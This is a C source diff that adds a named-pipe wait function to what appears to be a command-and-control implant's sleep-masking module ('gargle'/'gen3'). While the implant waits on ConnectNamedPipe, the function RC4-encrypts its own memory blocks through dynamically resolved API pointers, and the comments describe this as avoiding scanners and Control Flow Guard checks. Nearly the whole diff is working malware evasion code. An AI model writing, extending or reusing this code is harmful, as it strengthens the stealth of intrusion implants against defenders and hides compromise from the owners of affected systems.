@@ -814,4 +814,107 @@ BOOL gen3_sleep(DWORD time)
 	return TRUE;
 }
 
+/* ---------------- Phase 2 wait-window ----------------
+ *
+ * The 4.5 wait-mask trampoline was never implemented here (INT3
+ * placeholders, defused in round 16): the pipe/TCP channel waits ran
+ * unmasked as a result. This restores masking with the gen3 machinery:
+ * the blocking wait runs between mask and unmask through pre-resolved
+ * pointers only - the same window contract as the sleep path, minus the
+ * timers (an indefinite wait has no wake time to schedule beats around,
+ * and skipping them makes the wait CFG-immune for free). */
+
+typedef struct {
+	BOOL (WINAPI *pConnectNamedPipe)(HANDLE, LPOVERLAPPED);
+	DWORD (WINAPI *pGetLastError)(void);
+	HANDLE pipe;
+	BOOL   r;
+	DWORD  err;
+} G3_PIPEWAIT;
+
+static void g3_wait_cnp(void * v)
+{
+	G3_PIPEWAIT * w = (G3_PIPEWAIT *)v;
+
+	w->r = w->pConnectNamedPipe(w->pipe, NULL);
+	w->err = w->pGetLastError();
+}
+
+BOOL gen3_wait_pipe(HANDLE pipe)
+{
+	unsigned char key[16];
+	G3_BLOCK blocks[G3_MAX_BLOCKS];
+	G3_MASKCTX mctx;
+	G3_PIPEWAIT w;
+	int nblocks;
+	int i;
+
+	if (gparms == NULL)
+		gargle_setup_parms(NULL, NULL, 0);
+	if (!g_inited && !g3_init())
+		return FALSE;
+
+	w.pConnectNamedPipe = (BOOL (WINAPI *)(HANDLE, LPOVERLAPPED))
+		GetProcAddress(GetModuleHandleA("kernel32.dll"), "ConnectNamedPipe");
+	w.pGetLastError = (DWORD (WINAPI *)(void))
+		GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetLastError");
+	if (w.pConnectNamedPipe == NULL || w.pGetLastError == NULL)
+		return FALSE;
+	w.pipe = pipe;
+	w.r = FALSE;
+	w.err = 0;
+
+	{
+		unsigned int * k = (unsigned int *)key;
+		for (i = 0; i < 4; i++)
+			k[i] = bigger_rand();
+	}
+
+	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
+	if (nblocks == 0)
+		return FALSE;
+
+	mctx.blocks = blocks;
+	mctx.nblocks = nblocks;
+	for (i = 0; i < 16; i++)
+		mctx.key[i] = key[i];
+	mctx.fn = g_sf032;
+#if defined(G3_TRACE)
+	mctx.io = g_io;
+#endif
+
+	/* the window: mask everything, block on the caller's primitive,
+	 * unmask. The callback contract (frame-locals only) is the same one
+	 * the sleep path proved across 2000+ audited windows. */
+	g3_mask_all_cb(&mctx);
+	g3_wait_cnp(&w);
+	for (i = 0; i < nblocks; i++)
+		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+
+	for (i = 0; i < 16; i++)
+		key[i] = 0;
+	for (i = 0; i < (int)sizeof(mctx); i++)
+		((unsigned char *)&mctx)[i] = 0;
+
+	if (w.r || w.err == ERROR_PIPE_CONNECTED)
+		return TRUE; /* connected (or a client had connected before us) */
+	return FALSE;   /* caller takes the plan-B loop for error handling */
+}
+
+#else /* !_M_X64 */
+
+BOOL gen3_wait_pipe(HANDLE pipe)
+{
+	(void)pipe;
+	return FALSE;
+}
+
+/* gen3 is x64-only; unguarded callers (pivot/TCP wait slices) get the
+ * plain-sleep fallback via the existing GargleSleep nook==0 behavior. */
+BOOL gen3_sleep(DWORD time)
+{
+	(void)time;
+	return FALSE;
+}
+
 #endif /* _M_X64 */
